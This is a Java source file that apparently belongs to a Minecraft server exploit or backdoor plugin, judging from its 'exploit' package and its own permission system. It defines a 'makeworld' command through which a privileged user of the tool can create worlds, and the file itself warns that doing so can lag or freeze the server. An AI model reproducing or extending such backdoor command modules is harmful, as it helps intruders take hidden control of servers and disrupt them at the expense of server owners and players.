package com.tmquan2508.exploit.commands;

import com.tmquan2508.exploit.Exploit;
import org.bukkit.Bukkit;
import org.bukkit.WorldCreator;
import org.bukkit.entity.Player;

public class MakeWorldCommand extends Command {
    public MakeWorldCommand() { super(); }
    @Override public String getName() { return "makeworld"; }
    @Override public String getDescription() { return "Creates a new world. This can cause significant server lag."; }
    @Override public String getUsage() { return "<name>"; }
    @Override public int getRequirePerm() { return 2; }
    @Override public void execute(Player sender, String[] args) {
        if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
        String worldName = args[0];
        if (Bukkit.getWorld(worldName) != null) { Exploit.sender.sendError(sender, "A world with this name already exists."); return; }
        Exploit.sender.sendMessage(sender, "Starting to create world '" + worldName + "'. The server will freeze during this process!");
        Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
            new WorldCreator(worldName).createWorld();
            Exploit.sender.sendMessage(sender, "World '" + worldName + "' has been created successfully!");
        });
    }
}